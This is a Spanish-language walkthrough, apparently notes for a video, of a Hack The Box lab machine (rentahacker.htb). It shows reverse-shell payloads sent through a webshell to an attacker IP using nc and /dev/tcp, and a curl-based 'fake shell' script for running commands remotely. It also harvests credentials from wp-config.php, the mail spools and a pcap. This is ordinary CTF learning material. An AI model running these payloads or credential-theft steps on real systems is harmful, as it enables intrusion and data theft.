## Explotacion de vulnerabilidad & Ganando acceso {-}

### Crear una reverse shell desde la webshell {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En la web

    ```bash
    http://sec03.rentahacker.htb/shell.php?hidden=nc -e /bin/bash 10.10.14.20 443
    http://sec03.rentahacker.htb/shell.php?hidden=bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    http://sec03.rentahacker.htb/shell.php?hidden=bash -c "bash -i >& /dev/tcp/10.10.14.20/443 0>&1"
    http://sec03.rentahacker.htb/shell.php?hidden=bash -c 'bash -i >& /dev/tcp/10.10.14.20/443 0>&1'
    http://sec03.rentahacker.htb/shell.php?hidden=whoami | nc 10.10.14.20 443
    ```

Como aqui vemos que nada functionna, pensamos que hay reglas que son definidas en el *iptables*

### Creamos una FakeShell {-}

En el directorio exploits creamos un fichero `fakeShell.sh` que contiene

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# Variables globales
declare -r main_url="http://sec03.rentahacker.htb/shell.php"

while true; do
    echo -n "[~] " && read -r command
    echo; curl -s -X GET -G $main_url --data-urlencode "hidden=$command"; echo
done
```

Ya lo podemos lanzar con el comando `rlwrap ./fakeShell.sh`

> [ ! ] Notas: Las explicaciones del script se pueden ver en el video live en el minuto 1:15:38

Tambien se podria utilizar la herramienta creada por s4vitar [ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)

### Enumeramos el equipo {-}

```bash
ls -l /home
whoami
ls -l /home/ib01c03
ls wp-config.php
find \-name wp-config.php
find / \-name wp-config.php
cat /home/ib01c03/www/wp-config.php
```

Vemos un fichero comprimido de wordpress. Buscamos el fichero de configuracion de wordpress que suele tener credenciales en
texto claro. Una vez encontrado lo miramos con `cat`. Encontramos usuario y contraseña para el servicio mysql. Aqui no hay nada interesante.

### Chequeamos ficheros del servicio SMTP {-}

Los ficheros de email suelen ser guardados en el `/var/spool/mail`. Aqui vemos dos ficheros y une tiene credenciales para el **FTP** en texto claro.

### Conexion por ftp {-}

```bash
ftp 10.10.10.155
Name: ib01ftp
Password: 
```

ya hemos podido entrar en la maquina. Vemos archivos y nos los descargamos a la maquina de atacante

```bash
binary
prompt off
mget *
```

Hay ficheros interesantes como `notes.txt` o `ib01c01.access.log` que nos dan pistas pero nosotros vamos a por el fichero `ib01c01_incident.pcap`

### Investigamos el fichero pcap con TShark {-}

```bash
tshark -r ib01c01_incident.pcap
tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" 2>/dev/null
tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" -Tjson 2>/dev/null
tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
```

Analizando aqui encontramos passwords que son codeadas en url-encode. Tratamos de conectar con el usuario de estos ficheros `ib01c01` con la 
nueva contraseña y pa dentro. Ya podemos ver el fichero **user.txt**

### Continuacion de la investigacion con Wireshark {-}

Aqui llegamos a una parte bastante complicada de explicar por escrito. Mejor verlo directamente con el video desde el minuto 1:40:45
De echo esta parte explica como encuentra un modulo rootkit en el sistema y explica como tratarla.




